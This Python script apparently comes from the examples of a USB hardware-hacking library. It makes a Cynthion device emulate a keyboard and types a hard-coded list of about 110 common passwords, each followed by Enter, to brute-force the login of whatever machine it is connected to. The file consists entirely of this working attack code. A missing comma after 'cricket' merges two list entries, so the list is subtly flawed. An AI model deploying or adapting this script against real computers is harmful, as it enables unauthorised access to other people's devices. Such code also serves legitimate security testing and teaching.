#!/usr/bin/env python3

# This script is designed to use the Cynthion device to simulate a USB keyboard, and attempt to guess a password using a list
# of common passwords. It types each password followed by the Enter key.

import asyncio

from facedancer import main
from facedancer.devices.keyboard     import USBKeyboardDevice

device = USBKeyboardDevice()

# Example common passwords to try, can be modified to include more
common_passwords = [
    "000000",
    "0000000",
    "00000000",
    "111111",
    "1111111",
    "11111111",
    "121212",
    "123",
    "123123",
    "123321",
    "1234",
    "12345",
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "1234567890",
    "222222",
    "2222222",
    "22222222",
    "333333",
    "3333333",
    "33333333",
    "444444",
    "4444444",
    "44444444",
    "555555",
    "5555555",
    "55555555",
    "654321",
    "666666",
    "6666666",
    "66666666",
    "777777",
    "7777777",
    "77777777",
    "87654321",
    "888888",
    "8888888",
    "88888888",
    "999999",
    "9999999",
    "99999999",
    "987654321",
    "a1b2c3",
    "abc123",
    "admin",
    "admin1",
    "admin123",
    "administrator",
    "baseball",
    "basketball",
    "batman",
    "charlie",
    "christ",
    "computer",
    "cricket"
    "dragon",
    "flower",
    "football",
    "google",
    "guest",
    "hello",
    "hockey",
    "iloveyou",   
    "Iloveyou", 
    "jesus",
    "letmein",     
    "login",
    "lovely",
    "master",
    "monkey",
    "mustang",
    "ninja",
    "password",
    "password1",
    "password123",
    "passw0rd",
    "Password",
    "Password1",
    "Password123",
    "Passw0rd",
    "P@ssword1",
    "P@ssword123",
    "P@ssw0rd",
    "picture1",
    "princess",
    "qwerty",
    "qwerty1",
    "qwerty123",
    "qwertyuiop",
    "secret",
    "secret1",
    "secret123",
    "senha",
    "service", 
    "service1", 
    "service123", 
    "shadow",
    "starwars",
    "summer",
    "sunshine",
    "superman",
    "supervisor",
    "supervisor1",
    "test",
    "test123",
    "trust",
    "trustno1",
    "welcome",
    "welcome1",
    "windows",
    "!@#$%^&*"
]

# This function will iterate through the list of common passwords, typing each one and then pressing Enter.
# This example is a very basic approach and may need to be adjusted based on the target system's requirements.
async def guess_common_passwords():

    # Wait for device to connect
    await asyncio.sleep(2)

    for password in common_passwords:

        print("Attempting password: " + password)

        # Type the password followed by Enter (newline)
        await device.type_string(password + "\n")

main(device, guess_common_passwords())
